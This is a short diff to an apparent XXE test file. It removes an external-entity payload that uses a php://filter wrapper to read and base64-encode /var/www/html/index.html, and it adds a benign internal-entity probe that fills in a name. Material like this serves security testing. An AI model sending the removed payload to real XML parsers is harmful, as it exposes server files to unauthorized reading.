@@ -1,4 +1,6 @@
-<?xml version="1.0"?>
-<!DOCTYPE foo [
-<!ENTITY ac SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/index.html">]>
-<foo><result>&ac;</result></foo>
+<!--?xml version="1.0" ?-->
+<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
+ <userInfo>
+  <firstName>John</firstName>
+  <lastName>&example;</lastName>
+ </userInfo>
